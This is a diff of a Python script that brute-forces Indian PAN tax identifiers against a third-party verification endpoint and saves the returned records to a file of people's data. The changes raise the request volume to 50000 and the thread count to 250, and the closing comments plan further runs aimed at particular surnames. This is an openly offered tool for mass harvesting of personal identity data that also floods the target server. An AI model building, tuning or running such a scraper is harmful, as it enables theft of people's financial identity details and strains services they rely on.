@@ -13,11 +13,11 @@ import sys
 
 #-------------------------------------------------------
 #Important!!!
-#ulimit -Sn 10000
+#ulimit -Sn 65000
 #-------------------------------------------------------
 
 start_time = time.time()
-RequestingSPEED = 10000
+RequestingSPEED = 50000
 urls = ['http://searchpan.in/verification_process_run10.php']*RequestingSPEED
 print ('Reuqesting at ' + str(len(urls)) + ' requests!!!!')
 PeopleData = "PeopleData.csv"
@@ -102,7 +102,7 @@ def ParseDataInFile(Pan):
 		return DataArgs
 
 	counter = 0
-	with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+	with concurrent.futures.ThreadPoolExecutor(max_workers=250) as executor:
 	    future_to_url = {executor.submit(load_url, url, 60): url for url in urls}
 	    for future in concurrent.futures.as_completed(future_to_url):
 	        url = future_to_url[future]
@@ -117,7 +117,7 @@ def ParseDataInFile(Pan):
 
 Pan = ''
 PanList = []
-alphabet = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Zs']
+alphabet = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
 digits = ['0','1','2','3','4','5','6','7','8','9']
 global AlphaCount
 def main(StartingPan):
@@ -142,6 +142,6 @@ def main(StartingPan):
 			else:
 				pass
 
-main('AAAPR0000I')
+main('AAAPD9542W')
 #Next is with Sharma or Shau
 #Nif doesnt work, try, AAAPT1231F
